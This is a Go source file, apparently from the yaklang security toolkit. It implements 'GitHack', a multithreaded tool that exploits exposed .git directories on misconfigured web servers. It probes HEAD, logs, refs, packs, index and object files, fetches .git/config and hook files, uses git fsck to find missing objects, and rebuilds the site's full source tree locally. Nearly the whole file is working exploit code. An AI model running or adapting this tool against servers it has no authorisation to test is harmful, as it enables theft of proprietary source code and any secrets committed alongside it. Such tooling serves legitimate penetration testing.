package yakgit

import (
	"bytes"
	"fmt"
	"github.com/yaklang/yaklang/common/utils/lowhttp/poc"
	"io/ioutil"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"strings"
	"sync"

	"github.com/PuerkitoBio/goquery"
	"github.com/go-git/go-git/v5"
	"github.com/go-git/go-git/v5/plumbing"
	"github.com/go-git/go-git/v5/plumbing/format/index"
	"github.com/go-git/go-git/v5/plumbing/format/packfile"
	"github.com/go-git/go-git/v5/plumbing/object"
	"github.com/samber/lo"
	"github.com/yaklang/yaklang/common/log"
	"github.com/yaklang/yaklang/common/utils"
	"github.com/yaklang/yaklang/common/utils/lowhttp"
)

var (
	DEFAULT_GIT_FILES = []string{
		// ".git/HEAD",
		// ".git/index",
		// ".git/logs/HEAD",
		// ".git/objects/info/packs",
		// ".git/refs/stash",
		".git/COMMIT_EDITMSG",
		".git/description",
		".git/info/exclude",
		".git/FETCH_HEAD",
		".git/logs/refs/remotes/origin/HEAD",
		".git/ORIG_HEAD",
		".git/packed-refs",
		".git/logs/refs/stash",
		".git/refs/remotes/origin/HEAD",
		".git/objects/info/alternates",
		".git/objects/info/http-alternates",
		".git/refs/tags/v0.0.1",
		".git/refs/tags/0.0.1",
		".git/refs/tags/v1.0.0",
		".git/refs/tags/1.0.0",
	}
	DEFAULT_GIT_FILES_DANGEROUS = []string{
		".git/config",
		".git/hooks/applypatch-msg",
		".git/hooks/commit-msg",
		".git/hooks/fsmonitor-watchman",
		".git/hooks/post-update",
		".git/hooks/pre-applypatch",
		".git/hooks/pre-commit",
		".git/hooks/pre-merge-commit",
		".git/hooks/pre-push",
		".git/hooks/pre-rebase",
		".git/hooks/pre-receive",
		".git/hooks/prepare-commit-msg",
		".git/hooks/update",
	}

	COMMON_BRANCH_NAMES = []string{
		"daily",
		"dev",
		"feature",
		"feat",
		"fix",
		"hotfix",
		"issue",
		"main",
		"master",
		"ng",
		"quickfix",
		"release",
		"test",
		"testing",
		"wip",
	}

	EXPAND_BRANCH_NAME_PATH = []string{
		".git/logs/refs/heads",
		".git/logs/refs/remotes/origin",
		".git/refs/remotes/origin",
		".git/refs/heads",
	}

	HEAD_REGEX      = regexp.MustCompile("ref: refs/heads/([a-zA-Z0-9_-]+)")
	LOGs_HEAD_REGEX = regexp.MustCompile("checkout: moving from ([a-zA-Z0-9_-]+) to ([a-zA-Z0-9_-]+)")
	HASH_REGEX      = regexp.MustCompile("[a-f0-9]{40}")
	PACK_REGEX      = regexp.MustCompile("P pack-([a-z0-9]{40}).pack")
)

// GitHack is a function used to exploit Git source code leakage vulnerabilities
// of HEAD The Git source code leakage vulnerability refers to: Due to the misconfiguration of the website server, / HTTPS Directly access the files in the .git directory of the website, resulting in source code leakage
// Example:
// ```
// git.GitHack("http://127.0.0.1:8787/git/website", "C:/Users/xxx/Desktop/githack-test", git.threads(8))
// ```
func GitHack(remoteRepoURL string, localPath string, opts ...Option) (finalErr error) {
	c := &config{
		Remote:            "origin",
		Threads:           8,
		UseLocalGitBinary: true,
	}
	for _, o := range opts {
		if err := o(c); err != nil {
			return err
		}
	}

	if !utils.IsHttpOrHttpsUrl(remoteRepoURL) {
		return utils.Errorf("remoteRepoURL must be http or https url: %s", remoteRepoURL)
	}

	// . Create the temporary folder
	tempDirPath, err := os.MkdirTemp(os.TempDir(), "githack")
	defer func() {
		if finalErr != nil {
			os.RemoveAll(tempDirPath)
		}
	}()
	if err != nil {
		return utils.Wrap(err, "make temp dir error")
	}
	o := NewGitHackObject(remoteRepoURL, tempDirPath, c)
	remoteRepoURL = o.remoteRepoURL

	log.Debugf("download temp git repo to %s", tempDirPath)

	// Check .git/HEAD. Since its response will be used later, we first Save it
	headContent, err := o.checkGitHead()
	if err != nil {
		return utils.Wrap(err, "check git head error")
	}

	// Determine whether there is a directory traversal vulnerability
	canDirectoryTraversal := true
	if err := o.checkDirectoryTraversal(); err != nil {
		log.Debugf("%v", err)
		canDirectoryTraversal = false
	}

	fakeOKContent, err := o.checkFakeOK()
	if len(fakeOKContent) > 0 {
		o.isFakeOK = true
		o.fakeOKContent = fakeOKContent
	}

	// Add common branch
	branches := make([]string, len(COMMON_BRANCH_NAMES))
	copy(branches, COMMON_BRANCH_NAMES)
	// . Parse HEAD to get the current branch
	branches = append(branches, o.parseHeadBranch(headContent)...)
	// Parse logs/HEAD to get branch
	logsHeadContent, err := o.downloadFile(".git/logs/HEAD")
	if err == nil {
		branches = append(branches, o.parseLogsHeadBranch(logsHeadContent)...)
	}
	branches = lo.Uniq(branches)
	// Extend the default git file path
	defaultGitFiles := make([]string, len(DEFAULT_GIT_FILES))
	copy(defaultGitFiles, DEFAULT_GIT_FILES)
	for _, expand := range EXPAND_BRANCH_NAME_PATH {
		for _, branch := range branches {
			fileURL, err := utils.UrlJoin(remoteRepoURL, expand, branch)
			if err != nil {
				continue
			}
			defaultGitFiles = append(defaultGitFiles, fileURL)
		}
	}

	// Open repository
	repo, err := git.PlainOpen(tempDirPath)
	if err != nil {
		return utils.Wrap(err, "open git repo error")
	}

	// . wg is used to wait for all consumers to close, and taskwg is used to wait for all current tasks to be completed.
	wg, taskwg := &sync.WaitGroup{}, &sync.WaitGroup{}
	ch := make(chan string)

	// Start the consumer
	for i := 0; i < c.Threads; i++ {
		wg.Add(1)
		go o.consumeTask(wg, taskwg, ch)
	}

	// . If directory traversal is possible, directly add the task
	if canDirectoryTraversal {
		o.addTaskDir(ch, ".git")
		close(ch)
	} else {
		// pack
		log.Debugf("[githack] pack files")
		packContent, err := o.downloadFile(".git/objects/info/packs")
		if err == nil {
			o.addPackTask(ch, taskwg, repo, packContent, tempDirPath)
		}
		// basic
		log.Debugf("[githack] basic files")
		o.addBasicTask(ch, defaultGitFiles)
		// HEAD
		log.Debugf("[githack] head files")
		o.addHeadTask(ch, headContent)
		// LOGS HEAD
		log.Debugf("[githack] log head files")
		o.addHashParsedTask(ch, "log-head", headContent)
		// index
		log.Debugf("[githack] index files")
		_, err = o.downloadFile(".git/index")
		if err == nil {
			o.addIndexTask(ch, repo)
		}
		// stash
		log.Debugf("[githack] stash files")
		stashContent, err := o.downloadFile(".git/refs/stash")
		if err == nil {
			o.addHashParsedTask(ch, "stash", stashContent)
		}
		// commit
		taskwg.Wait()
		log.Debugf("[githack] commit")
		o.addCommitTask(ch, repo)
		// tree
		taskwg.Wait()
		log.Debugf("[githack] tree")
		o.addTreeTask(ch, repo)
		// fsck
		if c.UseLocalGitBinary {
			taskwg.Wait() // wait until other task done
			log.Debugf("[githack] fsck if have git executable")
			command, err := utils.GetExecutableFromEnv("git")
			if err == nil {
				o.addFsckTask(ch, taskwg, command)
			}
		}
		close(ch)
	}

	wg.Wait()
	// Forces checkout and restores to the last commit
	if err = o.checkoutLastCommit(repo); err != nil {
		return utils.Wrap(err, "checkout last commit error")
	}

	// Copy the temporary directory to the target directory
	if err = utils.ConcurrentCopyDirectory(tempDirPath, localPath, c.Threads); err != nil {
		return utils.Wrapf(err, "copy temp git repo to %s error", localPath)
	}

	return nil
}

type GitHackObject struct {
	remoteRepoURL string // of HEAD. The vulnerable URL
	tempDirPath   string // temporary directory

	config   *config              // git config
	cache    map[string]struct{}  // URL cache
	mutex    *sync.Mutex          // cache mutex
	httpOpts []lowhttp.LowhttpOpt // http config

	isFakeOK      bool   // Does the website have a false 200 response
	fakeOKContent []byte // content
}

func NewGitHackObject(remoteRepoURL, tempDirPath string, gitConfig *config) *GitHackObject {
	c := poc.NewDefaultPoCConfig()
	for _, o := range gitConfig.HTTPOptions {
		o(c)
	}

	// Process URL Contains .git or .git/can cause a false 200 response through HTTP
	if strings.HasSuffix(remoteRepoURL, ".git") {
		remoteRepoURL = remoteRepoURL[:len(remoteRepoURL)-4]
	} else if strings.HasSuffix(remoteRepoURL, ".git/") {
		remoteRepoURL = remoteRepoURL[:len(remoteRepoURL)-5]
	}

	return &GitHackObject{
		remoteRepoURL: remoteRepoURL,
		tempDirPath:   tempDirPath,
		config:        gitConfig,
		cache:         make(map[string]struct{}),
		mutex:         &sync.Mutex{},
		httpOpts:      c.ToLowhttpOptions(),
	}
}

func (o *GitHackObject) addTask(ch chan string, tag string, taskURL ...string) {
	count := 0
	for _, u := range taskURL {
		// caches
		o.mutex.Lock()
		if _, ok := o.cache[u]; ok {
			o.mutex.Unlock()
			continue
		}
		o.cache[u] = struct{}{}
		o.mutex.Unlock()

		count++
		ch <- u
	}
	if tag != "" {
		log.Debugf("[%s] task count: %d", tag, count)
	}
}

func (o *GitHackObject) addIndexTask(ch chan string, r *git.Repository) {
	remoteRepoURL := o.remoteRepoURL

	i, err := r.Storer.Index()
	if err != nil {
		log.Errorf("get git repo index error: %v", err)
		return
	}

	// cache objects
	taskURLs := lo.FilterMap(i.Cache.Entries, func(entry index.TreeEntry, _ int) (string, bool) {
		hash := entry.Hash.String()
		taskURL, err := o.getHashTask(hash, remoteRepoURL)
		return taskURL, err == nil
	})
	o.addTask(ch, "index-cache", taskURLs...)

	// objects
	taskURLs = lo.FilterMap(i.Entries, func(entry *index.Entry, _ int) (string, bool) {
		hash := entry.Hash.String()
		taskURL, err := o.getHashTask(hash, remoteRepoURL)
		return taskURL, err == nil
	})
	o.addTask(ch, "index", taskURLs...)
}

func (o *GitHackObject) addPackTask(ch chan string, taskwg *sync.WaitGroup, r *git.Repository, packsContent []byte, repoPath string) {
	remoteRepoURL := o.remoteRepoURL
	packHashes := PACK_REGEX.FindAllString(utils.UnsafeBytesToString(packsContent), -1)
	taskURLs := make([]string, 0, len(packHashes)*2)
	// Download pack and idx file
	for _, hash := range packHashes {
		taskURL, err := utils.UrlJoin(remoteRepoURL, ".git", "objects", "pack", fmt.Sprintf("pack-%s.idx", hash))
		if err != nil {
			continue
		}
		taskURLs = append(taskURLs, taskURL)

		taskURL, err = utils.UrlJoin(remoteRepoURL, ".git", "objects", "pack", fmt.Sprintf("pack-%s.pack", hash))
		if err != nil {
			continue
		}
		taskURLs = append(taskURLs, taskURL)
	}
	o.addTask(ch, "pack-self", taskURLs...)
	taskwg.Wait()

	// Parse the pack file
	for _, taskURL := range taskURLs {
		if !strings.HasSuffix(taskURL, ".pack") {
			continue
		}
		content, err := o.getFileFromLocal(remoteRepoURL, repoPath)
		if err != nil {
			log.Debugf("get file from local error: %v", err)
			continue
		}
		obs := new(packObserver)
		scanner := packfile.NewScanner(bytes.NewReader(content))
		parser, err := packfile.NewParser(scanner, obs)
		if err != nil {
			log.Errorf("new pack parser error: %v", err)
			return
		}
		_, err = parser.Parse()
		if err != nil {
			log.Errorf("parse pack error: %v", err)
			return
		}
		for _, obj := range obs.objects {
			taskURL, err := o.getHashTask(obj.hash, remoteRepoURL)
			if err != nil {
				log.Errorf("get hash task error: %v", err)
				continue
			}
			o.addTask(ch, "pack-objects", taskURL)
		}
	}

}

func (o *GitHackObject) addBasicTask(ch chan string, defaultGitFiles []string) {
	remoteRepoURL := o.remoteRepoURL
	// DEFAULT_GIT_FILES
	taskURLs := lo.FilterMap(defaultGitFiles, func(taskURL string, _ int) (string, bool) {
		taskURL, err := utils.UrlJoin(remoteRepoURL, taskURL)
		if err != nil {
			return "", false
		}
		return taskURL, true
	})
	o.addTask(ch, "basic-default", taskURLs...)

	// DEFAULT_GIT_FILES_DANGEROUS
	taskURLs = lo.FilterMap(DEFAULT_GIT_FILES_DANGEROUS, func(taskURL string, _ int) (string, bool) {
		taskURL, err := utils.UrlJoin(remoteRepoURL, taskURL)
		if err != nil {
			return "", false
		}
		return taskURL, true
	})
	o.addTask(ch, "basic-dangerous", taskURLs...)
}

func (o *GitHackObject) addHeadTask(ch chan string, content []byte) {
	tempDirPath := o.tempDirPath
	contentString := utils.UnsafeBytesToString(content)
	for _, line := range strings.Split(strings.ReplaceAll(contentString, "\r", ""), "\n") {
		// Parse each ref in HEAD If
		if strings.HasPrefix(line, "ref: ") {
			refPath := strings.TrimSpace(strings.Split(line, "ref: ")[1])
			fullRefPath := filepath.Join(tempDirPath, ".git", "logs", refPath)
			// file does not exist, skip
			if ok, err := utils.PathExists(fullRefPath); !ok || err != nil {
				continue
			}
			if content, err := os.ReadFile(fullRefPath); err != nil {
				log.Debugf("read file[%s] error: %v", fullRefPath, err)
				continue
			} else {
				o.addHashParsedTask(ch, "head", content)
			}
		}
	}
}

func (o *GitHackObject) addHashParsedTask(ch chan string, tag string, content []byte) int {
	remoteRepoURL := o.remoteRepoURL
	hashes := HASH_REGEX.FindAllString(utils.UnsafeBytesToString(content), -1)
	if len(hashes) == 0 {
		return 0
	}
	taskURLs := lo.FilterMap(hashes, func(hash string, _ int) (string, bool) {
		taskURL, err := o.getHashTask(hash, remoteRepoURL)
		return taskURL, err == nil
	})
	taskURLs = lo.Uniq(taskURLs)
	if len(taskURLs) > 0 {
		o.addTask(ch, tag, taskURLs...)
	}
	return len(taskURLs)
}

func (o *GitHackObject) addFsckTask(ch chan string, taskwg *sync.WaitGroup, command string) {
	// fsck is used for the final check
	// . Run git fsck until the hash is not found.
	taskNum, maxNum := 1, 10
	for taskNum > 0 && maxNum > 0 {
		cmd := exec.Command(command, "fsck", "--full")
		cmd.Dir = o.tempDirPath
		output, _ := cmd.CombinedOutput()
		taskNum = o.addHashParsedTask(ch, "fsck", output)
		maxNum--
	}
}

func (o *GitHackObject) addCommitTask(ch chan string, r *git.Repository) {
	remoteRepoURL := o.remoteRepoURL

	commitIter, err := r.CommitObjects()
	if err != nil {
		log.Errorf("get references failed: %s", err)
		return
	}

	commitIter.ForEach(func(commit *object.Commit) error {
		treeHash := commit.TreeHash.String()
		taskURL, err := o.getHashTask(treeHash, remoteRepoURL)
		if err == nil {
			o.addTask(ch, "commit-tree-hashes", taskURL)
		} else {
			log.Debugf("get hash task error: %v", err)
		}
		hashes := commit.ParentHashes
		taskURLs := lo.FilterMap(hashes, func(hash plumbing.Hash, _ int) (string, bool) {
			taskURL, err := o.getHashTask(hash.String(), remoteRepoURL)
			return taskURL, err == nil
		})
		o.addTask(ch, "commit-parent-hashes", taskURLs...)
		return nil
	})
}

func (o *GitHackObject) addTreeTask(ch chan string, r *git.Repository) {
	remoteRepoURL := o.remoteRepoURL

	treeIter, err := r.TreeObjects()
	if err != nil {
		log.Errorf("get git repo trees failed: %s", err)
		return
	}
	treeIter.ForEach(func(t *object.Tree) error {
		taskURLs := lo.FilterMap(t.Entries, func(entry object.TreeEntry, _ int) (string, bool) {
			hash := entry.Hash.String()
			taskURL, err := o.getHashTask(hash, remoteRepoURL)
			return taskURL, err == nil
		})
		o.addTask(ch, "tree-entries", taskURLs...)
		return nil
	})
}

func (o *GitHackObject) addTaskDir(ch chan string, paths ...string) {
	var (
		remoteRepoURL string = o.remoteRepoURL
		baseURL       string = o.remoteRepoURL
		err           error
	)

	if len(paths) > 0 {
		baseURL, err = utils.UrlJoin(baseURL, paths...)
		if err != nil {
			log.Debugf("URL join error: %v", err)
			return
		}
	}

	_, body, err := o.request("GET", remoteRepoURL, paths...)
	if err != nil {
		log.Debugf("request error: %v", err)
		return
	}
	document, err := goquery.NewDocumentFromReader(bytes.NewReader(body))
	if err != nil {
		log.Debugf("parse raw response to http document error: %v", err)
		return
	}
	document.Find("[href]").Each(func(_ int, selection *goquery.Selection) {
		newPath, _ := selection.Attr("href")
		if strings.HasSuffix(newPath, "/") {
			o.addTaskDir(ch, baseURL, newPath)
			return
		}
		newURL, err := utils.UrlJoin(baseURL, newPath)
		if err != nil {
			log.Debugf("url join error: %v", err)
			return
		}

		// Prevent access to other domain names
		if !strings.Contains(newURL, remoteRepoURL) {
			return
		}

		ch <- newURL
	})
}

func (o *GitHackObject) consumeTask(wg, taskwg *sync.WaitGroup, ch chan string) {
	tempDirPath := o.tempDirPath

	defer wg.Done()
	for taskURL := range ch {
		taskwg.Add(1)

		rsp, body, err := o.request("GET", taskURL)
		if err != nil {
			log.Debugf("request error: %v", err)
			taskwg.Done()
			continue
		}

		u, err := url.Parse(taskURL)
		if err != nil {
			log.Debugf("parse url[%s] error: %v", taskURL, err)
			taskwg.Done()
			continue
		}

		if rsp.StatusCode != 200 || len(body) == 0 {
			taskwg.Done()
			continue
		}
		if o.isFakeOK && utils.CalcSimilarity(o.fakeOKContent, body) > 0.85 {
			log.Debugf("met fake OK response, skip: %s", taskURL)
			taskwg.Done()
			continue
		}

		urlPath := u.Path
		gitIndex := strings.Index(urlPath, ".git/")
		if gitIndex >= 0 {
			urlPath = urlPath[gitIndex:]
		}
		savePath := filepath.Join(tempDirPath, urlPath)
		if err := saveToFile(savePath, body); err != nil {
			log.Debugf("save file[%s] error: %v", savePath, err)
		}

		if strings.Contains(taskURL, ".git/objects/") {
			decoded, err := utils.ZlibDeCompress(body)
			if err == nil {
				body = decoded
			}
		}
		go o.addHashParsedTask(ch, "consume-regexp", body)
		taskwg.Done()
	}
}

func (o *GitHackObject) getFileFromLocal(remoteRepoURL string, tempDirPath string) ([]byte, error) {
	u, err := url.Parse(remoteRepoURL)
	if err != nil {
		return nil, utils.Wrap(err, "parse url error")
	}
	paths := strings.Split(u.Path, "/")
	paths = append([]string{tempDirPath}, paths...)
	fp := filepath.Join(paths...)
	if ok, err := utils.PathExists(fp); ok && err == nil {
		return os.ReadFile(fp)
	} else if err != nil {
		return nil, utils.Wrap(err, "check path exists error")
	} else {
		return nil, utils.Errorf("file not exists: %s", fp)
	}
}

func (o *GitHackObject) getHashTask(hash string, remoteRepoURL string) (string, error) {
	if hash == "0000000000000000000000000000000000000000" {
		return "", utils.Errorf("empty hash")
	}
	taskURL, err := utils.UrlJoin(remoteRepoURL, ".git", "objects", hash[0:2], hash[2:])
	if err != nil {
		return "", err
	}
	return taskURL, nil
}

func (o *GitHackObject) parseHeadBranch(content []byte) []string {
	matched := HEAD_REGEX.FindAllStringSubmatch(utils.UnsafeBytesToString(content), -1)
	return lo.Map(matched, func(item []string, _ int) string {
		return item[1]
	})
}

func (o *GitHackObject) parseLogsHeadBranch(content []byte) []string {
	matched := LOGs_HEAD_REGEX.FindAllStringSubmatch(utils.UnsafeBytesToString(content), -1)
	result := lo.Map(matched, func(item []string, _ int) string {
		return item[1]
	})
	result = append(result, lo.Map(matched, func(item []string, _ int) string {
		return item[2]
	})...)
	return result
}

func (o *GitHackObject) checkoutLastCommit(r *git.Repository) error {
	// Get the working tree
	w, err := r.Worktree()
	if err != nil {
		return utils.Wrap(err, "get git repo worktree error")
	}

	// Get the reference
	ref, err := r.Head()
	if err != nil {
		return utils.Wrap(err, "get git repo HEAD ref error")
	}

	// Get the commit object of HEAD
	commit, err := r.CommitObject(ref.Hash())
	if err != nil {
		return utils.Wrap(err, "get git repo HEAD commit error")
	}

	// Check out the commit
	err = w.Checkout(&git.CheckoutOptions{
		Hash:  commit.Hash,
		Force: true,
	})
	if err != nil {
		return utils.Wrap(err, "checkout git repo error")
	}

	return nil
}

func (o *GitHackObject) checkFakeOK() ([]byte, error) {
	remoteRepoURL := o.remoteRepoURL

	rsp, body, err := o.request("GET", remoteRepoURL, ".git/"+utils.RandStringBytes(16))
	if err != nil {
		return body, utils.Wrap(err, "request error")
	}
	if rsp.StatusCode == 200 {
		return body, nil
	}

	return nil, nil
}

func (o *GitHackObject) checkGitHead() ([]byte, error) {
	remoteRepoURL := o.remoteRepoURL
	tempDirPath := o.tempDirPath

	rsp, body, err := o.request("GET", remoteRepoURL, ".git/HEAD")
	if err != nil {
		return nil, utils.Wrapf(err, "target URL[%s] is not a git repository", remoteRepoURL)
	} else if rsp.StatusCode != 200 {
		return nil, utils.Errorf("target URL[%s] is not a git repository", remoteRepoURL)
	} else {
		savePath := filepath.Join(tempDirPath, ".git", "HEAD")
		saveToFile(savePath, body)
	}

	return body, nil
}

func (o *GitHackObject) downloadFile(path string) ([]byte, error) {
	remoteRepoURL := o.remoteRepoURL
	tempDirPath := o.tempDirPath

	rsp, body, err := o.request("GET", remoteRepoURL, path)
	if rsp.StatusCode != 200 && err == nil {
		err = utils.Errorf("%s not found", path)
	}
	if err == nil {
		paths := strings.Split(path, "/")
		paths = append([]string{tempDirPath}, paths...)
		savePath := filepath.Join(paths...)
		saveToFile(savePath, body)
	}
	return body, err
}

func (o *GitHackObject) checkDirectoryTraversal() error {
	remoteRepoURL := o.remoteRepoURL

	rsp, body, err := o.request("GET", remoteRepoURL, ".git")
	if err != nil {
		return utils.Wrap(err, "directory traversal error")
	}
	if rsp.StatusCode == 200 && (bytes.Contains(body, []byte("<title>Index of")) || bytes.Contains(body, []byte("Directory listing for"))) {
		return nil
	}

	return utils.Errorf("target URL[%s] can't directory traversal", remoteRepoURL)
}

func (o *GitHackObject) request(method, baseURL string, paths ...string) (*http.Response, []byte, error) {
	var (
		targetURL string = baseURL
		err       error
	)

	if len(paths) > 0 {
		targetURL, err = utils.UrlJoin(baseURL, paths...)
		if err != nil {
			return nil, nil, utils.Wrap(err, "URL join error")
		}
	}

	_, raw, err := lowhttp.ParseUrlToHttpRequestRaw(method, targetURL)
	if err != nil {
		return nil, nil, utils.Wrap(err, "parse URL to raw http request error")
	}
	opts := make([]lowhttp.LowhttpOpt, len(o.httpOpts), len(o.httpOpts)+1)
	copy(opts, o.httpOpts)
	opts = append(opts, lowhttp.WithPacketBytes(raw))
	// opts = append(opts, lowhttp.WithNoFixContentLength(true), lowhttp.WithTimeoutFloat(1))

	lowhttpRsp, err := lowhttp.HTTP(opts...)
	if err != nil {
		return nil, nil, utils.Wrap(err, "http request error")
	}

	rsp, err := lowhttp.ParseBytesToHTTPResponse(lowhttpRsp.RawPacket)
	if err != nil {
		return nil, nil, utils.Wrap(err, "parse http response error")
	}
	_, body := lowhttp.SplitHTTPPacketFast(lowhttpRsp.RawPacket)

	return rsp, body, nil
}

func saveToFile(path string, content []byte) error {
	dir := filepath.Dir(path)

	// Determine whether the directory exists
	if _, err := os.Stat(dir); os.IsNotExist(err) {
		// Create directory
		err = os.MkdirAll(dir, 0755)
		if err != nil {
			return err
		}
	}

	// Write the content to the file
	err := ioutil.WriteFile(path, content, 0644)
	if err != nil {
		return err
	}

	return nil
}
